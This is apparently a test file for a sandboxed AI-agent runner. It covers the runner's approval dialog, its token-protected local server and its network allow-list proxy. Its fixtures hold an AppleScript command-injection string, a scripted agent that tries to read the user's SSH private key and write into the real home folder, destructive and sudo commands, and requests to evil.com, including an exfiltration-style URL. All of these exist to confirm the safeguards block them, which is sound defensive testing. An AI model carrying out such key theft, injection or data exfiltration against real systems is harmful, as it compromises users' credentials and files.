// The standalone nexus-agent (core/src/standalone.ts): its local server, the approval dialog, approvals from another
// terminal and — where this computer can isolate programs — a whole run for real: a scripted "agent" inside the
// real sandbox talks MCP through the real bridge, runs commands, tries to get the person's SSH key both directly and
// through NEXUS, asks for a critical command (approved) and another (denied).
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn } from "node:child_process";
import { createStandalone, dialogApprover, approvalText, liveRuns, agentEnv, type Approver } from "../src/standalone.ts";
import { detectPlatform } from "../src/agent-platform.ts";
import type { Approval } from "../src/agentd.ts";

const REPO = path.join(path.dirname(new URL(import.meta.url).pathname), "..", "..");
const CLI = path.join(REPO, "cli", "nexus-agent.ts");
const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "nexus-alone-")));
function fakeHome() {
  const home = tmp(), project = path.join(home, "proyectos", "web");
  fs.mkdirSync(path.join(project, "src"), { recursive: true });
  fs.writeFileSync(path.join(project, "src", "a.js"), "export const a = 1;\n");
  fs.mkdirSync(path.join(home, ".ssh")); fs.writeFileSync(path.join(home, ".ssh", "id_ed25519"), "PRIVATE KEY\n");
  return { home, project };
}
const AP: Approval = { id: "a1", run: "r1", agent: "web", agentName: "web", title: "git push origin main", detail: "Publishes commits to the remote repository (git push). Folder: ~/proyectos/web.", risk: "git-push", at: "2026-11-10T12:00:00.000Z" };

test("the approval dialog: the text travels as arguments, Deny is the default, only the exact Approve button approves", async () => {
  const calls: { cmd: string; args: string[] }[] = [];
  const fake = (answers: Record<string, { code: number | null; out?: string; missing?: boolean }>) => async (cmd: string, args: string[]) => { calls.push({ cmd, args }); const a = answers[path.basename(cmd)] ?? { code: null, missing: true }; return { code: a.code, out: a.out ?? "", missing: a.missing === true }; };
  const evil = { ...AP, title: `echo "\\" & do shell script \\"touch /tmp/pwned\\""` };
  assert.equal(await dialogApprover({ platform: "darwin", exec: fake({ osascript: { code: 0, out: "Approve\n" } }) })(evil, "en"), true);
  const mac = calls.at(-1)!;
  const script = mac.args.slice(0, mac.args.indexOf("--")).join(" ");
  assert.ok(!script.includes("pwned") && !script.includes("git push"), "nothing of the request is inside the script");
  assert.ok(mac.args[mac.args.indexOf("--") + 1].includes("touch /tmp/pwned"), "it is shown as text");
  assert.match(script, /default button 1 cancel button 1/);
  assert.deepEqual(mac.args.slice(-2), ["Deny", "Approve"]);
  assert.equal(await dialogApprover({ platform: "darwin", exec: fake({ osascript: { code: 1 } }) })(AP, "en"), false);          // cancelled
  assert.equal(await dialogApprover({ platform: "darwin", exec: fake({ osascript: { code: 0, out: "" } }) })(AP, "en"), false);  // gave up
  assert.equal(await dialogApprover({ platform: "darwin", exec: fake({ osascript: { code: 0, out: "Aprobar" } }) })(AP, "es"), true);
  assert.equal(await dialogApprover({ platform: "darwin", exec: fake({ osascript: { code: 0, out: "Deny" } }) })(AP, "en"), false);
  // Linux: zenity, else kdialog, else nothing to show; without a desktop nothing is tried
  const x = { DISPLAY: ":0" };
  assert.equal(await dialogApprover({ platform: "linux", env: x, exec: fake({ zenity: { code: 0 } }) })(AP, "en"), true);
  assert.ok(calls.at(-1)!.args.includes("--default-cancel") && calls.at(-1)!.args.includes("--no-markup"));
  assert.equal(await dialogApprover({ platform: "linux", env: x, exec: fake({ zenity: { code: 5 } }) })(AP, "en"), false);       // timed out
  assert.equal(await dialogApprover({ platform: "linux", env: x, exec: fake({ kdialog: { code: 0 } }) })(AP, "en"), true);
  assert.equal(await dialogApprover({ platform: "linux", env: x, exec: fake({}) })(AP, "en"), null);
  const n = calls.length;
  assert.equal(await dialogApprover({ platform: "linux", env: {}, exec: fake({ zenity: { code: 0 } }) })(AP, "en"), null);
  assert.equal(calls.length, n);
  assert.match(approvalText(AP, "es"), /«web» quiere ejecutar:\n\n {4}git push origin main\n\nPublishes/);
});

const passthrough = { tools: [], available: () => true, agent: (s: { agentHome: string }) => ({ argv: ["/usr/bin/env"], home: s.agentHome }), command: (c: string, cwd: string) => ["/bin/sh", "-c", `cd '${cwd}' && ${c}`] };

test("the local server: only this computer, never a web page; agents by their run token; the rest by the admin token", async () => {
  const { home, project } = fakeHome();
  const sa = await createStandalone({ cliPath: CLI, home, approver: async () => null, platform: passthrough as never, watch: false });
  try {
    const base = `http://127.0.0.1:${sa.port}`;
    const get = (p: string, headers: Record<string, string> = {}) => fetch(base + p, { headers });
    assert.equal((await get("/admin/approvals")).status, 401);
    assert.equal((await get("/admin/approvals", { authorization: "Bearer nope" })).status, 401);
    assert.equal((await get("/admin/approvals", { authorization: `Bearer ${sa.admin}` })).status, 200);
    assert.equal((await get("/admin/approvals", { authorization: `Bearer ${sa.admin}`, origin: "https://evil.example" })).status, 403);
    const viaName = await new Promise<number>((res) => { import("node:http").then((h) => h.get({ host: "127.0.0.1", port: sa.port, path: "/admin/approvals", headers: { host: "evil.example", authorization: `Bearer ${sa.admin}` } }, (r) => { r.resume(); res(r.statusCode!); })); });
    assert.equal(viaName, 403);
    const rpc = (token: string) => fetch(base + "/mcp", { method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list" }) });
    assert.equal((await rpc("x".repeat(32))).status, 401);
    assert.equal((await rpc(sa.admin)).status, 401, "the admin token is not an agent");
    const a = sa.ensureAgent(project);
    assert.deepEqual([a.name, a.council, a.maxUsd, a.maxTokens], ["web", false, 0, 0]);
    assert.equal(sa.ensureAgent(project).id, a.id, "the same folder is the same agent");
    const r = sa.agents.startRun(a.id, { program: "test" });
    const tools = (await (await rpc(r.token)).json()).result.tools.map((t: { name: string }) => t.name);
    assert.ok(tools.includes("run_command") && tools.includes("fs_read_file"));
    assert.equal((await get("/admin/approvals", { authorization: `Bearer ${r.token}` })).status, 401, "an agent cannot answer its own requests");
    // the home itself, or a folder outside it, is never a project
    assert.throws(() => sa.ensureAgent(home)); assert.throws(() => sa.ensureAgent("/usr"));
    // the bridge is started with this node and this script
    const cfg = JSON.parse(fs.readFileSync(r.env.NEXUS_MCP_CONFIG, "utf8")).mcpServers.nexus;
    assert.equal(cfg.command, process.execPath); assert.deepEqual(cfg.args.slice(-2), [CLI, "mcp"]);
    assert.equal(r.env.ANTHROPIC_BASE_URL, undefined, "no API key given: nothing goes through the proxy");
  } finally { await sa.close(); }
});

test("approvals without a desktop wait for the other terminal; the run file is private and goes away", async () => {
  const { home, project } = fakeHome();
  const pendings: Approval[] = [];
  const sa = await createStandalone({ cliPath: CLI, home, approver: async () => null, platform: passthrough as never, onPending: (ap) => pendings.push(ap), watch: false });
  try {
    sa.publish(project);
    assert.equal(fs.statSync(sa.runFile).mode & 0o777, 0o600);
    assert.deepEqual(liveRuns(sa.stateDir).map((r) => [r.pid, r.port, r.folder]), [[process.pid, sa.port, project]]);
    fs.writeFileSync(path.join(sa.stateDir, "run", "999999.json"), JSON.stringify({ pid: 999999, port: 1, admin: "x", folder: "/x" }));
    assert.equal(liveRuns(sa.stateDir).length, 1);
    assert.ok(!fs.existsSync(path.join(sa.stateDir, "run", "999999.json")), "a dead run's file is cleaned up");
    const a = sa.ensureAgent(project), r = sa.agents.startRun(a.id, { program: "test" });
    const base = `http://127.0.0.1:${sa.port}`, admin = { authorization: `Bearer ${sa.admin}`, "content-type": "application/json" };
    const call = (command: string) => fetch(base + "/mcp", { method: "POST", headers: { authorization: `Bearer ${r.token}`, "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 7, method: "tools/call", params: { name: "run_command", arguments: { command } } }) }).then((x) => x.json());
    const waiting = call("rm -r src");
    const until = async <V>(f: () => Promise<V | undefined | false>) => { for (let i = 0; i < 200; i++) { const v = await f(); if (v) return v; await new Promise((x) => setTimeout(x, 15)); } throw new Error("timeout"); };
    const ap = await until(async () => (await (await fetch(base + "/admin/approvals", { headers: admin })).json()).approvals[0] as Approval | undefined);
    assert.equal(ap.title, "rm -r src"); assert.match(ap.detail, /^Deletes whole folders \(rm -r\)\. Folder: ~\/proyectos\/web\.$/);
    assert.equal(pendings.length, 1);
    assert.equal((await fetch(base + "/admin/decide", { method: "POST", headers: admin, body: JSON.stringify({ id: ap.id, approve: false }) })).status, 200);
    assert.match((await waiting).result.content[0].text, /did not approve/);
    assert.ok(fs.existsSync(path.join(project, "src")));
    assert.equal((await fetch(base + "/admin/decide", { method: "POST", headers: admin, body: JSON.stringify({ id: ap.id, approve: true }) })).status, 409, "answered once");
  } finally { await sa.close(); }
  assert.ok(!fs.existsSync(sa.runFile));
});

// ---- a whole run inside the real sandbox
const AGENT = `
import fs from "node:fs"; import { spawn } from "node:child_process"; import readline from "node:readline";
const cfg = JSON.parse(fs.readFileSync(process.env.NEXUS_MCP_CONFIG, "utf8")).mcpServers.nexus;
const b = spawn(cfg.command, cfg.args, { stdio: ["pipe", "pipe", "inherit"] });
const wait = new Map(); let id = 0;
readline.createInterface({ input: b.stdout }).on("line", (l) => { const m = JSON.parse(l); wait.get(m.id)?.(m); });
const rpc = (method, params) => new Promise((r) => { const i = ++id; wait.set(i, r); b.stdin.write(JSON.stringify({ jsonrpc: "2.0", id: i, method, params }) + "\\n"); });
const run = async (command) => (await rpc("tools/call", { name: "run_command", arguments: { command } })).result.content[0].text;
const out = {};
out.server = (await rpc("initialize", { protocolVersion: "2025-06-18", clientInfo: { name: "fake-agent" } })).result.serverInfo.name;
out.echo = await run("echo hola-desde-nexus && pwd");
out.stealViaNexus = await run("cat " + process.env.KEY + " 2>&1; ls " + process.env.REALHOME + " 2>&1 | head -3");
out.push = await run("git push origin main 2>&1; echo push-ran");
out.rm = await run("rm -r src");
out.sudo = await run("sudo apt install x");
try { out.stealDirect = fs.readFileSync(process.env.KEY, "utf8"); } catch (e) { out.stealDirect = "blocked:" + e.code; }
try { fs.writeFileSync(process.env.REALHOME + "/pwned.txt", "x"); out.writeHome = "wrote"; } catch (e) { out.writeHome = "blocked:" + e.code; }
fs.writeFileSync("hecho-por-el-agente.txt", "ok\\n");
console.log(JSON.stringify(out)); b.stdin.end(); setTimeout(() => process.exit(0), 100);
`;

test("a whole run, for real: the agent works, cannot take the keys (directly or through NEXUS), and critical commands wait for the person", { skip: !detectPlatform({ home: os.homedir(), commandHome: os.tmpdir() })?.available() }, async () => {
  const { home, project } = fakeHome();
  const asked: Approval[] = [];
  const approver: Approver = async (ap) => { asked.push(ap); return /git push/.test(ap.title); };   // approve the push, deny the rest
  const sa = await createStandalone({ cliPath: CLI, extraTools: [path.join(REPO, "core", "src")], home, approver, watch: false });
  try {
    fs.writeFileSync(path.join(project, "agent.mjs"), AGENT);
    const a = sa.ensureAgent(project), r = sa.agents.startRun(a.id, { program: "node agent.mjs", interactive: false });
    const key = path.join(home, ".ssh", "id_ed25519");
    const env = { ...agentEnv(sa.home, sa.platform.tools, r.home, r.env), PATH: `${path.dirname(process.execPath)}:${agentEnv(sa.home, sa.platform.tools, r.home, r.env).PATH}`, KEY: key, REALHOME: home };
    const child = spawn(r.argv[0], [...r.argv.slice(1), process.execPath, "agent.mjs"], { cwd: project, env, stdio: ["ignore", "pipe", "pipe"] });
    let out = "", err = ""; child.stdout.on("data", (d) => { out += d; }); child.stderr.on("data", (d) => { err += d; });
    const code = await new Promise<number | null>((res) => { const t = setTimeout(() => { child.kill("SIGKILL"); }, 60_000); child.on("close", (c) => { clearTimeout(t); res(c); }); });
    assert.equal(code, 0, `agent failed:\n${out}\n${err}`);
    const got = JSON.parse(out.trim().split("\n").at(-1)!);
    assert.equal(got.server, "nexus");
    assert.match(got.echo, /^exit 0/); assert.ok(got.echo.includes("hola-desde-nexus") && got.echo.includes(project));
    // the key: not directly, and not by asking NEXUS to run an ordinary command either
    assert.match(got.stealDirect, /^blocked:/);
    assert.ok(!got.stealViaNexus.includes("PRIVATE KEY"), got.stealViaNexus);
    // (on Linux the agent has a private home at the same path: writing "there" is allowed and never reaches the real one)
    assert.ok(!fs.existsSync(path.join(home, "pwned.txt")), got.writeHome);
    // critical commands: the person was asked for exactly these two, in English, and their answers held
    assert.deepEqual(asked.map((x) => x.title), ["git push origin main 2>&1; echo push-ran", "rm -r src"]);
    assert.match(asked[0].detail, /^Publishes commits to the remote repository/);
    assert.ok(got.push.includes("push-ran"), got.push);
    assert.match(got.rm, /did not approve/); assert.ok(fs.existsSync(path.join(project, "src", "a.js")));
    assert.match(got.sudo, /refused/); assert.match(got.sudo, /administrator rights/);
    assert.equal(fs.readFileSync(path.join(project, "hecho-por-el-agente.txt"), "utf8"), "ok\n");
    sa.agents.endRun(r.run, code);
    const log = sa.agents.view().runs[0].activity.map((x: { outcome: string }) => x.outcome);
    assert.ok(log.includes("approved") && log.includes("denied"));
  } finally { await sa.close(); }
});

// ---- the network filter (core/src/netfilter.ts)
import net from "node:net";
import http from "node:http";
import { startNetFilter, hostAllowed, checkHost, proxyEnv, DEFAULT_HOSTS } from "../src/netfilter.ts";
import { macProfile } from "../src/agent-platform.ts";

test("network filter: only listed sites; addresses and this computer are never a destination", async () => {
  const allow = [...DEFAULT_HOSTS, ".ejemplo.es"];
  for (const ok of ["api.anthropic.com", "registry.npmjs.org", "ejemplo.es", "api.ejemplo.es", "API.Anthropic.com"]) assert.ok(hostAllowed(ok, allow), ok);
  for (const no of ["evil.com", "anthropic.com.evil.com", "notanthropic.com", "xapi.anthropic.com", "localhost", "127.0.0.1", "10.0.0.1", "::1", "[::1]", "169.254.169.254", "miequipo.local", "", "a b"]) assert.ok(!hostAllowed(no, allow), no);
  assert.equal(checkHost(" .Interno.Ejemplo.es "), ".interno.ejemplo.es");
  for (const bad of ["192.168.1.1", "localhost", "con espacios.es", "https://x.es", ""]) assert.throws(() => checkHost(bad), /not a host name/, bad);
  assert.equal(proxyEnv(1234).HTTPS_PROXY, "http://127.0.0.1:1234"); assert.equal(proxyEnv(1234).NO_PROXY, "127.0.0.1,localhost,::1");

  // a real proxy; "permitido.es" really lands on a local test server
  const origin = http.createServer((req, res) => { res.end("hola desde " + req.headers.host); });
  await new Promise<void>((r) => origin.listen(0, "127.0.0.1", r));
  const oport = (origin.address() as { port: number }).port;
  const told: string[] = [];
  const f = await startNetFilter({ allow: ["permitido.es"], onBlocked: (h) => told.push(h), dial: () => net.connect(oport, "127.0.0.1") });
  const connect = (target: string) => new Promise<string>((res) => {
    const s = net.connect(f.port, "127.0.0.1"); let buf = "";
    s.on("data", (d) => { buf += d; if (/\r\n\r\n/.test(buf) && !buf.startsWith("HTTP/1.1 200")) { s.destroy(); res(buf); } else if (buf.includes("hola desde")) { s.destroy(); res(buf); } });
    s.on("connect", () => s.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`));
    s.on("close", () => res(buf));
    setTimeout(() => { if (buf.startsWith("HTTP/1.1 200") && !buf.includes("GET-SENT")) { buf += "GET-SENT"; s.write("GET / HTTP/1.1\r\nHost: permitido.es\r\nConnection: close\r\n\r\n"); } }, 60);
  });
  try {
    assert.match(await connect("permitido.es:443"), /200 Connection Established[\s\S]*hola desde permitido\.es/);
    for (const t of ["evil.com:443", "127.0.0.1:22", "localhost:7777", "permitido.es:22", "169.254.169.254:80", `127.0.0.1:${oport}`]) assert.match(await connect(t), /^HTTP\/1\.1 403/, t);
    // plain HTTP through the proxy
    const viaProxy = (url: string) => new Promise<{ status: number; body: string }>((res) => { http.get({ host: "127.0.0.1", port: f.port, path: url, headers: { host: new URL(url).host } }, (r) => { let b = ""; r.on("data", (d) => { b += d; }); r.on("end", () => res({ status: r.statusCode!, body: b })); }); });
    assert.deepEqual(await viaProxy("http://permitido.es/"), { status: 200, body: "hola desde permitido.es" });
    assert.equal((await viaProxy("http://evil.com/robo?datos=1")).status, 403);
    assert.equal((await viaProxy(`http://127.0.0.1:${oport}/`)).status, 403);
    assert.ok(f.blocked.get("evil.com")! >= 2 && f.allowed.get("permitido.es")! >= 2);
    assert.deepEqual(told.filter((h) => h === "evil.com"), ["evil.com"], "told once per site");
  } finally { await f.close(); origin.closeAllConnections(); origin.close(); }
});

test("macOS profile, filtered: no direct way out and no name lookups; a command the person approved keeps the network", () => {
  const home = tmp(); fs.mkdirSync(path.join(home, "p"));
  const base = { home, agentHome: path.join(home, "a"), folder: path.join(home, "p"), read: [], write: [], tools: [] };
  const filtered = macProfile({ ...base, filtered: true });
  assert.ok(filtered.includes('(deny network-outbound)\n(allow network-outbound (remote ip "localhost:*"))') && !filtered.includes("mDNSResponder"));
  assert.ok(macProfile(base).includes("mDNSResponder") && !macProfile(base).includes("(deny network-outbound)\n"));
});

test("macOS, enforced: with the filter on, a program cannot reach the internet directly, only through NEXUS's list", { skip: process.platform !== "darwin" }, async () => {
  const { home, project } = fakeHome();
  const sa = await createStandalone({ cliPath: CLI, home, approver: async () => false, watch: false, allowHosts: ["example.org"] });
  try {
    assert.ok(sa.net && sa.net.enforced && sa.net.hosts.includes("example.org"));
    const a = sa.ensureAgent(project), r = sa.agents.startRun(a.id, { program: "probe" });
    const env = agentEnv(sa.home, sa.platform.tools, r.home, r.env, sa.net!.env);
    const run = (script: string) => new Promise<number | null>((res) => { const c = spawn(r.argv[0], [...r.argv.slice(1), "/bin/sh", "-c", script], { cwd: project, env, stdio: "ignore" }); c.on("close", res); });
    assert.notEqual(await run(`curl -s -m 5 --noproxy '*' -o /dev/null https://1.1.1.1/`), 0, "straight out by address");
    assert.notEqual(await run(`curl -s -m 5 --noproxy '*' -o /dev/null https://example.com/`), 0, "straight out by name (no lookups either)");
    assert.notEqual(await run(`curl -s -m 6 -f -o /dev/null https://evil-nexus-test.example.com/`), 0, "through the filter, not on the list");
    assert.ok(sa.net!.blocked.has("evil-nexus-test.example.com"));
    // the commands NEXUS runs for the agent are filtered the same way
    const out = await (async () => { const v = sa.platform.command(`curl -s -m 5 --noproxy '*' -o /dev/null https://1.1.1.1/ && echo SALIO || echo cerrado`, project, project, false); const c = spawn(v[0], v.slice(1), { env: sa.platform.env!(), stdio: ["ignore", "pipe", "ignore"] }); let o = ""; c.stdout.on("data", (d) => { o += d; }); await new Promise((res) => c.on("close", res)); return o; })();
    assert.match(out, /cerrado/);
    sa.agents.endRun(r.run, 0);
  } finally { await sa.close(); }
});
